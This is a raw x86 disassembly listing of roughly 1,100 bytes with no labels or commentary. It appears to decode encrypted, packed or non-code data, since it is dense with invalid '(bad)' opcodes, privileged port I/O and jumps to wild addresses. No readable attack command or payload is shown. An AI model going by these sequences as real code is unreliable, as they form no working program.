  41fc84:	mov    ebp,0xd7aeadc1
  41fc89:	mov    al,0xbb
  41fc8b:	jmp    0x41fc7c
  41fc8d:	retf   
  41fc8e:	mov    dh,0xbe
  41fc90:	fdiv   QWORD PTR [edx-0x26302c44]
  41fc96:	fsub   st(4),st
  41fc98:	int3   
  41fc99:	pop    es
  41fc9a:	add    eax,0x5ddfb00
  41fc9f:	out    dx,eax
  41fca0:	fmul   st(1),st
  41fca2:	int    0xd2
  41fca4:	mov    bl,0xe9
  41fca6:	ffree  st(5)
  41fca8:	lds    ebp,FWORD PTR [ebp-0x8244b15]
  41fcae:	dec    al
  41fcb0:	cmc    
  41fcb1:	cli    
  41fcb2:	mov    esi,0xd1fbdfc9
  41fcb7:	rol    BYTE PTR [ebx],cl
  41fcb9:	add    eax,0xf5fbc6f9
  41fcbe:	or     edi,ebp
  41fcc0:	in     al,0xc6
  41fcc2:	adc    cl,BYTE PTR [ecx]
  41fcc4:	repnz int 0xb7
  41fcc7:	out    dx,eax
  41fcc8:	loopne 0x41fcb3
  41fcca:	mov    ch,0xd9
  41fccc:	lock mov al,0xea
  41fccf:	rcr    ebp,1
  41fcd1:	cld    
  41fcd2:	rcr    eax,cl
  41fcd4:	sar    edx,cl
  41fcd6:	out    0xf3,eax
  41fcd8:	fadd   st,st(7)
  41fcda:	aad    0xf5
  41fcdc:	cld    
  41fcdd:	std    
  41fcde:	or     ah,al
  41fce0:	pop    es
  41fce1:	repz fimul WORD PTR ds:0xf7e1c5a8
  41fce8:	mov    bl,0xb2
  41fcea:	shl    BYTE PTR [eax-0x34212d4e],cl
  41fcf0:	mov    edi,0xbcbcdedb
  41fcf5:	call   0xc622ddf6
  41fcfa:	mov    esp,0xdcd4fcf5
  41fcff:	retf   
  41fd00:	(bad)  
  41fd01:	fld    QWORD PTR ds:0xe4bde3e8
  41fd07:	shl    edx,cl
  41fd09:	jmp    0x41fce6
  41fd0b:	leave  
  41fd0c:	(bad)  
  41fd0d:	(bad)  
  41fd0f:	jmp    0xf1d0:0xfee9f9b8
  41fd16:	icebp  
  41fd17:	fadd   st(3),st
  41fd19:	fcomp  st(4)
  41fd1b:	mov    esp,0xbcdbcbdb
  41fd20:	push   cs
  41fd21:	repz jmp 0x41fd2d
  41fd24:	enter  0xaec4,0xc8
  41fd28:	mov    al,0xc8
  41fd2a:	(bad)  
  41fd2b:	cmc    
  41fd2c:	mov    ecx,0xf5ecebd0
  41fd31:	in     al,0xdd
  41fd33:	into   
  41fd34:	fcomp  st(5)
  41fd36:	int3   
  41fd37:	add    ch,bh
  41fd39:	rcr    edi,cl
  41fd3b:	std    
  41fd3c:	loop   0x41fd07
  41fd3e:	add    cl,BYTE PTR [esi]
  41fd40:	inc    dl
  41fd42:	enter  0xc711,0xcd
  41fd46:	out    dx,al
  41fd47:	mov    bh,0xac
  41fd49:	hlt    
  41fd4a:	(bad)  
  41fd4b:	(bad)
  41fd4f:	shr    edx,1
  41fd51:	fldlg2 
  41fd53:	stc    
  41fd54:	int    0xf9
  41fd56:	add    eax,edi
  41fd58:	aad    0xd0
  41fd5a:	jmp    0x41fd34
  41fd5c:	or     edx,eax
  41fd5e:	fxam   
  41fd60:	loop   0x41fd6d
  41fd62:	fcmovne st,st(4)
  41fd64:	retf   
  41fd65:	mov    bl,0xcd
  41fd67:	cmc    
  41fd68:	retf   0xccd6
  41fd6b:	jmp    0xd11be458
  41fd70:	mov    esi,0xdc02cedb
  41fd75:	mov    eax,0xe505f0d1
  41fd7a:	add    bh,bl
  41fd7c:	or     ebp,eax
  41fd7e:	leave  
  41fd7f:	fsub   st(6),st
  41fd81:	retf   0xdea
  41fd84:	ffreep st(0)
  41fd86:	into   
  41fd87:	mov    bl,0xef
  41fd89:	(bad)  
  41fd8a:	repz shr ah,1
  41fd8d:	hlt    
  41fd8e:	enter  0xfae9,0xe9
  41fd92:	mov    edi,0xfedad0f1
  41fd97:	aad    0xe4
  41fd99:	(bad)  
  41fd9b:	add    al,0xdc
  41fd9d:	cmc    
  41fd9e:	cld    
  41fd9f:	jmp    0xdec8:0xe2c9f3f5
  41fda6:	icebp  
  41fda7:	xlat   BYTE PTR ds:[ebx]
  41fda8:	xlat   BYTE PTR ds:[ebx]
  41fda9:	int3   
  41fdaa:	mov    ch,0xe0
  41fdac:	jmp    0xecdd:0xedead6d4
  41fdb3:	fst    st(4)
  41fdb5:	mov    dh,0xf0
  41fdb7:	into   
  41fdb8:	loopne 0x41fd9f
  41fdba:	pop    es
  41fdbb:	loope  0x41fdb8
  41fdbd:	add    edi,ecx
  41fdbf:	or     ecx,edx
  41fdc1:	(bad)  
  41fdc2:	loop   0x41fd90
  41fdc4:	mov    esp,0xedf7c7d1
  41fdc9:	mov    esp,0xc0fbedc0
  41fdce:	(bad)  
  41fdcf:	out    0xce,al
  41fdd1:	leave  
  41fdd2:	out    dx,al
  41fdd3:	jecxz  0x41fda7
  41fdd5:	rcl    ebp,1
  41fdd7:	pop    es
  41fdd8:	mov    ebp,0x4f4ded2
  41fddd:	add    ah,al
  41fddf:	retf   
  41fde0:	add    eax,0xc2eecade
  41fde5:	loop   0x41fdbd
  41fde7:	loope  0x41fdab
  41fde9:	lock not al
  41fdec:	mov    dl,0xd6
  41fdee:	in     al,0xc9
  41fdf0:	in     eax,0xb8
  41fdf2:	mov    ebx,0xd1e1f3da
  41fdf7:	mov    DWORD PTR [esi],0xf4030bc4
  41fdfd:	(bad)  
  41fdfe:	cli    
  41fdff:	push   cs
  41fe00:	or     al,0xea
  41fe02:	syscall 
  41fe04:	mov    cl,0xef
  41fe06:	not    edx
  41fe08:	mov    bh,0xf1
  41fe0a:	les    edi,FWORD PTR [edx-0x2e19372a]
  41fe10:	int3   
  41fe11:	in     eax,dx
  41fe12:	(bad)  
  41fe14:	int3   
  41fe15:	(bad)  
  41fe16:	out    0xf4,eax
  41fe18:	fucomi st,st(4)
  41fe1a:	sar    DWORD PTR [eax-0x391efcfc],1
  41fe20:	fiadd  DWORD PTR ds:0xe7cc12ca
  41fe26:	fsubp  st(6),st
  41fe28:	out    dx,eax
  41fe29:	in     eax,0xeb
  41fe2b:	retf   0xd7c6
  41fe2e:	mov    ch,0xd8
  41fe30:	(bad)  
  41fe31:	mov    eax,0xdeccecd5
  41fe36:	lock int 0xe3
  41fe39:	or     edi,DWORD PTR [edi+ebx*8+0x4eb07f7]
  41fe40:	retf   0x5da
  41fe43:	(bad)  
  41fe44:	(bad)
  41fe47:	rcl    ecx,cl
  41fe49:	mov    dh,0xec
  41fe4b:	not    ebx
  41fe4d:	int3   
  41fe4e:	clc    
  41fe4f:	cli    
  41fe50:	xlat   BYTE PTR ds:[ebx]
  41fe51:	cld    
  41fe52:	out    dx,al
  41fe53:	xlat   BYTE PTR ds:[ebx]
  41fe54:	aam    0xb8
  41fe56:	out    dx,eax
  41fe57:	shl    bl,cl
  41fe59:	test   bl,0x6
  41fe5c:	in     al,0xf
  41fe5e:	out    dx,eax
  41fe5f:	(bad)  
  41fe60:	out    0xa,eax
  41fe62:	(bad)  
  41fe64:	loope  0x41fe29
  41fe66:	enter  0xc0f3,0xb6
  41fe6a:	loopne 0x41fe5b
  41fe6c:	(bad)  
  41fe6d:	cli    
  41fe6e:	in     al,dx
  41fe6f:	sar    esp,cl
  41fe71:	fdivr  st,st(2)
  41fe73:	mov    edi,0xe3fcfbd2
  41fe78:	in     al,dx
  41fe79:	ret    
  41fe7a:	sar    BYTE PTR [eax-0x353b1a36],cl
  41fe80:	fucomi st,st(6)
  41fe82:	fcomp  st(4)
  41fe84:	call   0xe226ca2f
  41fe89:	iret   
  41fe8a:	shl    BYTE PTR [eax-0x49133812],1
  41fe90:	fidivr WORD PTR [edx-0x11264302]
  41fe96:	(bad)  
  41fe98:	shl    ch,cl
  41fe9a:	fdivr  st(4),st
  41fe9c:	fcomip st,st(0)
  41fe9e:	add    eax,0xdecb00c4
  41fea3:	add    al,0xdd
  41fea5:	rcl    ebx,0xe3
  41fea8:	in     eax,0xea
  41feaa:	ret    0xcece
  41fead:	out    dx,eax
  41feae:	mov    bh,0xea
  41feb0:	mov    ch,0xbf
  41feb2:	(bad)  
  41feb3:	aam    0xec
  41feb5:	rcr    al,cl
  41feb7:	add    eax,0xcbdbc207
  41febc:	leave  
  41febd:	test   BYTE PTR [ebx],0xee
  41fec0:	retf   0xc9d9
  41fec3:	add    BYTE PTR [ecx-0x37365641],ch
  41fec9:	mov    esp,0xc0edd0b6
  41fece:	mov    ecx,0xb5ffcfde
  41fed3:	jecxz  0x41febd
  41fed5:	int    0xc2
  41fed7:	icebp  
  41fed8:	inc    DWORD PTR [ecx]
  41feda:	inc    bl
  41fedc:	xlat   BYTE PTR ds:[ebx]
  41fedd:	call   0xfd1005c8
  41fee2:	fcomp  st(5)
  41fee4:	int    0xe0
  41fee6:	(bad)  
  41fee7:	mov    bl,0xe1
  41fee9:	icebp  
  41feea:	mov    cl,0xc5
  41feec:	in     eax,dx
  41feed:	mov    ebx,0xd0ddfade
  41fef2:	add    bh,dl
  41fef4:	mov    ecx,0xd2edfebe
  41fef9:	sar    ebp,0xe9
  41fefc:	add    edi,edi
  41fefe:	iret   
  41feff:	out    dx,al
  41ff00:	fld    DWORD PTR [edi]
  41ff02:	or     ecx,DWORD PTR [eax]
  41ff04:	shl    BYTE PTR [ebx-0x383a530d],cl
  41ff0a:	rcl    esp,cl
  41ff0c:	clc    
  41ff0d:	mov    bh,0xb7
  41ff0f:	icebp  
  41ff10:	(bad)  
  41ff11:	mov    eax,0xffd0d5b1
  41ff16:	aam    0xd5
  41ff18:	add    al,al
  41ff1a:	rol    BYTE PTR [edx],0xe8
  41ff1d:	or     ebp,ecx
  41ff1f:	jmp    0xb3e5:0xe08fccf
  41ff26:	leave  
  41ff27:	mov    cl,0xca
  41ff29:	stos   BYTE PTR es:[edi],al
  41ff2a:	cli    
  41ff2b:	aad    0xc8
  41ff2d:	hlt    
  41ff2e:	mov    bh,0xf5
  41ff30:	aam    0xeb
  41ff32:	cmc    
  41ff33:	push   ebp
  41ff35:	mov    edx,0x1d3c0d5
  41ff3a:	push   es
  41ff3b:	dec    cl
  41ff3d:	cld    
  41ff3e:	lds    ecx,FWORD PTR [edx]
  41ff40:	into   
  41ff41:	psubusb mm4,mm5
  41ff44:	scas   al,BYTE PTR es:[edi]
  41ff45:	into   
  41ff46:	leave  
  41ff47:	lods   al,BYTE PTR ds:[esi]
  41ff48:	in     eax,0xb0
  41ff4a:	mov    bl,0xe5
  41ff4c:	(bad)  
  41ff4e:	mov    cl,0xcf
  41ff50:	mov    esi,0xe1ffffd3
  41ff55:	add    bh,BYTE PTR [eax-0x193b3d12]
  41ff5b:	in     al,0xfb
  41ff5d:	push   es
  41ff5e:	or     al,ch
  41ff60:	sti    
  41ff61:	or     ch,al
  41ff63:	retf   0xc9f0
  41ff66:	mov    cl,0xdc
  41ff68:	test   eax,0xf1c9eae0
  41ff6e:	clc    
  41ff6f:	div    ah
  41ff71:	mov    ecx,0xd5fbf8ef
  41ff76:	(bad)  
  41ff78:	add    eax,0xd60bcbe0
  41ff7d:	stc    
  41ff7e:	jmp    0xf2dd:0xd3e301fa
  41ff85:	call   0xb219c15d
  41ff8a:	out    dx,eax
  41ff8b:	cli    
  41ff8c:	(bad)  
  41ff8d:	repnz rcr edi,cl
  41ff90:	fnsave [esi-0xb2c2610]
  41ff96:	loope  0x41ff4c
  41ff98:	(bad)  
  41ff99:	in     al,dx
  41ff9a:	lock out 0xfd,al
  41ff9d:	(bad)  
  41ff9e:	mov    ebp,0xc5e2ebe7
  41ffa3:	jmp    0x41ff7e
  41ffa5:	mov    ebp,0xfbbdd2c7
  41ffaa:	loope  0x41ff76
  41ffac:	leave  
  41ffad:	in     eax,0xd4
  41ffaf:	fcomi  st,st(4)
  41ffb1:	mov    edi,0xb8f6d9b4
  41ffb6:	int3   
  41ffb7:	ret    
  41ffb8:	ret    0xdd
  41ffbb:	or     ebp,edx
  41ffbd:	cmc    
  41ffbe:	fld    st(0)
  41ffc0:	loopne 0x41ffc4
  41ffc2:	fisttp QWORD PTR ds:0xcadec6ac
  41ffc8:	retf   0xd2fb
  41ffcb:	retf   0xdbeb
  41ffce:	mov    ch,0xb0
  41ffd0:	fst    st(5)
  41ffd2:	jmp    0xdd38f4ba
  41ffd7:	(bad)  
  41ffd9:	rcl    ecx,cl
  41ffdb:	shl    esp,1
  41ffdd:	out    0xd7,al
  41ffdf:	add    al,0xed
  41ffe1:	add    ebp,ebp
  41ffe3:	ror    al,0xd8
  41ffe6:	mov    bl,0xc4
  41ffe8:	jecxz  0x41ffb5
  41ffea:	repnz mov cl,0xaf
  41ffed:	mov    al,0xfa
  41ffef:	into   
  41fff0:	repnz (bad) 
  41fff2:	shl    esp,cl
  41fff4:	int3   
  41fff5:	faddp  st(2),st
  41fff7:	(bad)  
  41fff8:	lock (bad) 
  41fffa:	or     dl,bh
  41fffc:	or     DWORD PTR [ecx],ecx
  41fffe:	enter  0xe6de,0xb
  420002:	or     eax,ebx
  420004:	loopne 0x41ffb8
  420006:	fmul   st(0),st
  420008:	(bad)  
  420009:	in     al,0xc1
  42000b:	out    dx,al
  42000c:	int    0xd3
  42000e:	sti    
  42000f:	mov    edi,0xd0fdfef7
  420014:	add    esi,ebp
  420016:	xlat   BYTE PTR ds:[ebx]
  420017:	hlt    
  420018:	fnstsw WORD PTR [ebp-0x3935282b]
  42001e:	(bad)  
  42001f:	jmp    0x42002c
  420021:	repz add ebx,ebp
  420024:	int3   
  420025:	ror    eax,1
  420027:	rol    ch,0xd0
  42002a:	(bad)  
  42002b:	in     al,dx
  42002c:	out    dx,eax
  42002d:	mov    cl,0xc5
  42002f:	mov    eax,0xcef0dfd4
  420034:	shr    dh,cl
  420036:	(bad)  
  420037:	out    0xed,al
  420039:	neg    ebp
  42003b:	loope  0x41fffe
  42003d:	jmp    0x420044
  42003f:	add    al,BYTE PTR [esi]
  420041:	int    0x4
  420043:	repnz iret 
  420045:	repnz test al,0xcb
  420048:	retf   0xc5e5
  42004b:	in     eax,dx
  42004c:	hlt    
  42004d:	xlat   BYTE PTR ds:[ebx]
  42004e:	int3   
  42004f:	into   
  420050:	jmp    0x420006
  420052:	mov    esp,0x7b9e8f2
  420057:	in     al,dx
  420058:	cli    
  420059:	mov    ebp,0xe8d8ebe3
  42005e:	lds    ecx,FWORD PTR [eax]
  420060:	out    dx,eax
  420061:	fild   DWORD PTR [eax]
  420063:	cli    
  420064:	shr    eax,cl
  420066:	int    0xe4
  420068:	mov    ebp,0xbbccd1c6
  42006d:	shl    ah,1
  42006f:	shr    ecx,cl
  420071:	shl    bh,1
  420073:	(bad)  
  420074:	(bad)  
  420075:	fiadd  WORD PTR [ecx]
  420077:	int    0x2
  420079:	fstp   st(0)
  42007b:	(bad)  
  42007c:	fcmovb st,st(0)
  42007e:	in     al,0xf8
  420080:	out    dx,al
  420081:	retf   0xdc1
  420084:	fucom  st(7)
  420086:	shl    ah,0xe0
  420089:	retf   0xd9cd
  42008c:	out    0xdf,al
  42008e:	retf   0xd1b7
  420091:	repz jmp 0xe3d5:0xf4efb7c3
  420099:	jmp    0x420066
  42009b:	jmp    0xda2b0564
  4200a0:	fmulp  st(5),st
  4200a2:	fcomip st,st(1)
  4200a4:	shr    BYTE PTR [edi-0x53190a19],1
  4200aa:	test   eax,0xbbf2f4bb
  4200af:	mov    edx,0xc2f0b5d2
  4200b4:	bnd call 0xde1df395
  4200ba:	ret    
  4200bb:	cld    
  4200bc:	push   es
  4200bd:	ret    0xe1cb
  4200c0:	add    edx,ebx
  4200c2:	loopne 0x4200b5
  4200c4:	out    0xde,eax
  4200c6:	ret    
  4200c7:	jmp    0xb82dd5c1
  4200cc:	mov    dh,0xb1
  4200ce:	mov    ebx,0x3feddb9
  4200d3:	mov    ebx,0xe2cffad5
  4200d8:	out    0xd0,eax
  4200da:	(bad)  
  4200dc:	std    
  4200dd:	test   al,0xee
  4200e0:	out    0x2,eax
  4200e2:	shr    esp,0xad
  4200e5:	into   
  4200e6:	int3   
  4200e7:	lods   eax,DWORD PTR ds:[esi]
  4200e8:	(bad)  
  4200e9:	mov    cl,0xe3
  4200eb:	sti    
  4200ec:	(bad)  
  4200ed:	hlt    
  4200ee:	mov    bh,0xf3
  4200f0:	call   0xe405febe
  4200f5:	sar    ah,cl
  4200f7:	add    edi,DWORD PTR [edi-0x70618fc]
  4200fd:	push   es
  4200fe:	or     ecx,DWORD PTR [ecx]
  420100:	push   cs
  420101:	add    ecx,eax
  420103:	or     ah,al
  420105:	mov    ebp,0xcfcff1b2
  42010a:	shl    ebx,1
  42010c:	fdiv   st,st(1)
  42010e:	leave  
  42010f:	hlt    
  420110:	retf   0xd1d2
  420113:	neg    al
  420115:	(bad)  
  420116:	fidivr DWORD PTR [esi-0x1d39242b]
  42011c:	div    esp
  42011e:	or     ebp,esi
  420120:	shufps xmm4,xmm7,0x13
  420124:	out    dx,eax
  420125:	shl    esi,cl
  420127:	lock call 0xc804e31e
  42012d:	mov    bh,0xe9
  42012f:	enter  0xeeef,0xcb
  420133:	in     al,dx
  420134:	out    dx,eax
  420135:	rcr    ebp,cl
  420137:	mov    ah,0xf7
  420139:	out    0xf0,al
  42013b:	mov    eax,0x4f8cad6
  420140:	std    
  420141:	loop   0x42012e
  420143:	fcmovu st,st(6)
  420145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420146:	jmp    0xf609cc37
  42014b:	(bad)  
  42014c:	repnz mov ecx,0xb8b4fef4
  420152:	int    0xfd
  420154:	mov    esi,0x1c3b5cd
  420159:	loope  0x42013f
  42015b:	retf   0x7c2
  42015e:	out    dx,al
  42015f:	add    al,0xff
  420161:	clc    
  420162:	fmulp  st(6),st
  420164:	loop   0x420150
  420166:	(bad)  
  420167:	jmp    0xb4e0:0xc4a9b5b2
  42016e:	leave  
  42016f:	shl    esp,1
  420171:	aad    0xc3
  420173:	ret    
  420174:	mov    esi,0xbefcd0f9
  420179:	fcmovu st,st(7)
  42017b:	add    dh,ah
  42017d:	leave  
  42017e:	jmp    0x42015c
  420180:	retf   
  420181:	cld    
  420182:	adc    ecx,ebp
  420184:	jmp    0x420144
  420186:	loop   0x42015f
  420188:	into   
  420189:	jmp    0x42015e
  42018b:	mov    bh,0xfb
  42018d:	mov    ch,0xdb
  42018f:	(bad)  
  420190:	(bad)  
  420192:	jmp    0x42017e
  420194:	cld    
  420195:	shl    al,1
  420197:	(bad)  
  420199:	(bad)
  42019c:	inc    BYTE PTR [esi]
  42019e:	ffree  st(6)
  4201a0:	ret    
  4201a1:	repz cld 
  4201a3:	add    eax,0xd6f3d0e2
  4201a8:	ret    0xb7ec
  4201ab:	shl    ecx,1
  4201ad:	jmp    0xd0f1:0xb5d7bef3
  4201b4:	icebp  
  4201b5:	ret    
  4201b6:	faddp  st(2),st
  4201b8:	loop   0x4201b9
  4201ba:	push   es
  4201bb:	mov    esp,0xd5d90be3
  4201c0:	push   cs
  4201c1:	add    ecx,eax
  4201c3:	or     eax,0xb7bebcae
  4201c8:	mov    bh,0xe0
  4201ca:	in     eax,0xac
  4201cc:	icebp  
  4201cd:	mov    ebx,0xbfddeebf
  4201d2:	(bad)  
  4201d3:	fnstcw WORD PTR [esi+0x7fde7d1]
  4201d9:	cld    
  4201da:	add    al,0xdf
  4201dc:	call   0xf54fffa2
  4201e1:	out    dx,al
  4201e2:	loopne 0x4201a8
  4201e4:	mov    edi,0xb7f7d0e6
  4201e9:	jmp    0xdfb6:0xc5c4d6cc
  4201f0:	mov    ebx,0xe1f8d0b2
  4201f5:	fmulp  st(5),st
  4201f7:	lock in eax,0xfc
  4201fa:	repz clc 
  4201fc:	mov    edi,0xfc03fac7
  420201:	jmp    0x4201e8
  420203:	add    al,0xae
  420205:	int3   
  420206:	iret   
  420207:	mov    dh,0xb6
  420209:	in     eax,0xd4
  42020b:	shl    dh,1
  42020d:	scas   al,BYTE PTR es:[edi]
  42020e:	out    0xdd,eax
  420210:	mov    bh,0xcc
  420212:	idiv   esi
  420214:	mov    ebp,0xffd9f0dd
  420219:	(bad)  
  42021b:	not    ch
  42021d:	(bad)  
  42021e:	leave  
  42021f:	aad    0xd4
  420221:	fsubr  st(2),st
  420223:	out    dx,al
  420224:	scas   al,BYTE PTR es:[edi]
  420225:	retf   
  420226:	rol    ch,0xeb
  420229:	div    edx
  42022b:	loop   0x420203
  42022d:	retf   0xffb0
  420230:	mov    ebx,0xe1c2ddf0
  420235:	add    ebp,ecx
  420237:	(bad)  
  420238:	int    0xba
  42023a:	std    
  42023b:	ffreep st(6)
  42023d:	in     al,0xd4
  42023f:	aad    0xc7
  420241:	hlt    
  420242:	clc    
  420243:	clc    
  420244:	(bad)  
  420245:	scas   eax,DWORD PTR es:[edi]
  420246:	(bad)  
  420248:	icebp  
  420249:	in     al,dx
  42024a:	aad    0xb3
  42024c:	sti    
  42024d:	out    0xbf,eax
  42024f:	aam    0xd3
  420251:	(bad)  
  420252:	ret    
  420253:	mov    eax,0xe3f6f6b9
  420258:	add    ebp,esi
  42025a:	(bad)  
  42025b:	fiadd  WORD PTR [edi]
  42025d:	jmp    0xf91ace41
  420262:	or     esi,ebx
  420264:	out    dx,al
  420265:	jmp    0xb3f4d52a
  42026a:	repz retf 0xd2ea
  42026e:	mov    ch,0xcc
  420270:	xlat   BYTE PTR ds:[ebx]
  420271:	sar    ebp,1
  420273:	out    dx,eax
  420274:	mov    esp,0xffd0f4cd
  420279:	stc    
  42027a:	in     eax,0xc2
  42027c:	not    ah
  42027e:	rcr    dl,0xfc
  420281:	repz (bad) 
  420284:	mov    cl,0xa9
  420286:	mov    dl,0xc7
  420288:	mov    cl,0xc5
  42028a:	icebp  
  42028b:	aad    0xed
  42028d:	sti    
  42028e:	leave  
  42028f:	icebp  
  420290:	mov    ch,0xcd
  420292:	mov    esp,0xeefdf6dd
  420297:	add    eax,0x706d8dd
  42029c:	or     DWORD PTR [eax],eax
  42029e:	mov    DWORD PTR [esi],0xe209dcd4
  4202a4:	retf   0xa9d2
  4202a7:	scas   eax,DWORD PTR es:[edi]
  4202a8:	jmp    0x42029b
  4202aa:	imul   DWORD PTR [eax-0x44521547]
  4202b0:	iret   
  4202b1:	into   
  4202b2:	cli    
  4202b3:	mov    ah,0xbd
  4202b5:	out    dx,eax
  4202b6:	sar    DWORD PTR [eax-0x3b062801],cl
  4202bc:	mov    edi,0xae101e4
  4202c1:	(bad)  
  4202c3:	out    dx,al
  4202c4:	enter  0xe5a6,0xe1
  4202c8:	(bad)
  4202cb:	leave  
  4202cc:	imul   cl
  4202ce:	fsubr  DWORD PTR [edx+edi*4+0x3dcbed5]
  4202d5:	stc    
  4202d6:	(bad)  
  4202d7:	mov    ebp,0xd1dbd0c7
  4202dc:	call   esp
  4202de:	test   esi,0xefccefd
  4202e4:	shl    bl,0xe2
  4202e7:	in     al,0xe8
  4202e9:	hlt    
  4202ea:	out    0xec,al
  4202ec:	retf   
  4202ed:	(bad)  
  4202ef:	stc    
  4202f0:	int3   
  4202f1:	(bad)  
  4202f2:	cmc    
  4202f3:	mov    ebp,0xe6bcd8fc
  4202f8:	inc    esi
  4202fa:	add    eax,ebx
  4202fc:	rol    BYTE PTR ds:0xcd0fe1cb,1
  420302:	pop    es
  420303:	stc    
  420304:	loopne 0x4202e5
  420306:	mov    bl,0xc2
  420308:	rep stos BYTE PTR es:[edi],al
  42030a:	icebp  
  42030b:	mov    dl,0xdb
  42030d:	imul   esp
  42030f:	mov    ebx,0xcdbbe9e8
  420314:	out    dx,eax
  420315:	pop    es
  420316:	(bad)  
  420318:	ffree  st(0)
  42031a:	fnstcw WORD PTR [ebx+ecx*1+0xfc5c7d0]
  420321:	ret    0x6c1
  420324:	in     eax,dx
  420325:	lods   eax,DWORD PTR ds:[esi]
  420326:	iret   
  420327:	scas   eax,DWORD PTR es:[edi]
  420328:	lock jmp 0xdb2bf1f1
  42032e:	sar    DWORD PTR [esi-0x35242903],cl
  420334:	iret   
  420335:	call   0xc26f33c
  42033a:	aad    0xe0
  42033c:	(bad)  
  42033e:	or     ebp,ebp
  420340:	fmul   QWORD PTR [ecx]
  420342:	retf   
  420343:	jmp    0xb2eac413
  420348:	in     al,0xe4
  42034a:	fcmovbe st,st(3)
  42034c:	out    dx,al
  42034d:	int    0xbb
  42034f:	out    dx,al
  420350:	idiv   bl
  420352:	mov    edx,0xfbfcf7dc
  420357:	stc    
  420358:	mov    ebp,0xd002cbf9
  42035d:	or     esi,ebp
  42035f:	or     cl,BYTE PTR [edx]
  420361:	(bad)  
  420362:	fst    st(2)
  420364:	mov    bl,0xdf
  420366:	(bad)  
  420368:	loope  0x420321
  42036a:	out    0xf6,al
  42036c:	out    dx,al
  42036d:	clc    
  42036e:	lods   eax,DWORD PTR ds:[esi]
  42036f:	out    0xf1,al
  420371:	(bad)  
  420373:	shr    cl,cl
  420375:	mov    edx,0xd7f6f5ce
  42037a:	in     eax,0xca
  42037c:	cld    
  42037d:	jmp    0x42036e
  42037f:	out    0xee,eax
  420381:	fucomi st,st(3)
  420383:	out    dx,eax
  420384:	enter  0xafc3,0xd3
  420388:	rep lods al,BYTE PTR ds:[esi]
  42038a:	int    0xb5
  42038c:	jmp    0xcdf7fc84
  420391:	repnz fldln2 
  420394:	loopne 0x420377
  420396:	in     al,dx
  420397:	add    DWORD PTR [ebx-0x1918083b],edi
  42039d:	shr    eax,0xe
  4203a0:	cli    
  4203a1:	(bad)  
  4203a3:	leave  
  4203a4:	scas   al,BYTE PTR es:[edi]
  4203a5:	call   0xeaf9c176
  4203aa:	into   
  4203ab:	mov    ch,0xd6
  4203ad:	mov    cl,0xca
  4203af:	into   
  4203b0:	iret   
  4203b1:	lock retf 0xcfea
  4203b5:	shl    al,1
  4203b7:	add    eax,esp
  4203b9:	ret    0xe9f2
  4203bc:	out    0x4,al
  4203be:	pandn  mm1,mm7
  4203c1:	cli    
  4203c2:	or     al,BYTE PTR [ecx]
  4203c4:	ret    0xc9ee
  4203c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203c8:	(bad)  
  4203c9:	lock mov bl,0xd5
  4203cc:	xlat   BYTE PTR ds:[ebx]
  4203cd:	iret   
  4203ce:	leave  
  4203cf:	stc    
  4203d0:	shl    dh,cl
  4203d2:	(bad)  
  4203d3:	mov    edi,0xb4ede8f6
  4203d8:	rol    al,0xea
  4203db:	rol    BYTE PTR [ecx],cl
  4203dd:	cld    
  4203de:	push   cs
  4203df:	call   0xc53dfde3
  4203e4:	mov    eax,0xc9d5a9ac
  4203e9:	lods   al,BYTE PTR ds:[esi]
  4203ea:	lock stc 
  4203ec:	mov    ecx,0xc9dab4c9
  4203f1:	(bad)  
  4203f2:	mov    esi,0xbdf0f4b9
  4203f7:	clc    
  4203f8:	cli    
  4203f9:	in     al,0xf1
  4203fb:	sar    dh,cl
  4203fd:	xlat   BYTE PTR ds:[ebx]
  4203fe:	aad    0xcf
  420400:	in     eax,0xcd
  420402:	add    ecx,ecx
  420404:	(bad)  
  420406:	(bad)  
  420408:	repnz mov dl,0xe1
  42040b:	mov    dh,0xb4
  42040d:	lock aad 0xef
  420410:	int    0xf7
  420412:	enter  0xf4f9,0xdd
  420416:	into   
  420417:	cld    
  420418:	add    esp,esi
  42041a:	rol    BYTE PTR [edi+eax*1],cl
  42041d:	fmul   st,st(3)
  42041f:	add    bl,cl
  420421:	adc    ecx,DWORD PTR [edi]
  420423:	in     al,dx
  420424:	mov    ebp,0xb2c4ecb8
  420429:	sti    
  42042a:	idiv   ebx
  42042c:	lock clc 
  42042e:	out    0xdb,al
  420430:	mov    edi,0xededbdca
  420435:	jecxz  0x42040d
  420437:	clc    
  420438:	loopne 0x42041f
  42043a:	aam    0xf1
  42043c:	test   edx,0xe9cec7e6
  420442:	int    0xe7
  420444:	shr    esp,1
  420446:	mov    esp,0xd5f0c0be
  42044b:	call   0xb809cb4a
  420450:	enter  0xf6d6,0xea
  420454:	loopne 0x420439
  420456:	add    dh,al
  420458:	add    ah,ah
  42045a:	mul    al
  42045c:	clc    
  42045d:	cld    
  42045e:	or     edi,esp
  420460:	(bad)  
  420462:	adc    ah,ch
  420464:	mov    dl,0xee
  420466:	ret    0xc1dd
  420469:	iret   
  42046a:	(bad)  
  42046b:	jmp    0x420457
  42046d:	push   ebp
  42046f:	icebp  
  420470:	fxch   st(2)
  420472:	mul    edx
  420474:	fadd   DWORD PTR [edi]
  420476:	jecxz  0x42044f
  420478:	cli    
  420479:	test   esi,0xf70909f2
  42047f:	enter  0xfcd4,0x4
  420483:	fisubr DWORD PTR [edi-0x433b2833]
  420489:	in     al,dx
  42048a:	rol    al,1
  42048c:	int    0xf9
  42048e:	retf   0xc5cb
  420491:	jecxz  0x420486
  420493:	mov    ebp,0x1c2d2dc
  420498:	add    eax,DWORD PTR [edi*4+0xed8dff1]
  42049f:	jmp    0xcec3:0xfc0bda0f
  4204a6:	(bad)
  4204a9:	sti    
  4204aa:	aam    0xc4
  4204ac:	repz out 0xd8,al
  4204af:	shl    ch,1
  4204b1:	ror    edx,cl
  4204b3:	out    dx,al
  4204b4:	ror    dh,cl
  4204b6:	std    
  4204b7:	push   es
  4204b8:	push   es
  4204b9:	mov    esp,0xeaf4d6c0
  4204be:	add    ecx,eax
  4204c0:	out    0xe6,eax
  4204c2:	int3   
  4204c3:	shl    bl,cl
  4204c5:	jmp    0xb5fa:0xb2cfcacc
  4204cc:	out    0xd2,eax
  4204ce:	out    0xf0,al
  4204d0:	mov    ch,0xed
  4204d2:	leave  
  4204d3:	jecxz  0x4204ac
  4204d5:	aad    0xfc
  4204d7:	add    BYTE PTR [esi-0x350e082c],bh
  4204dd:	call   0xec0610c3
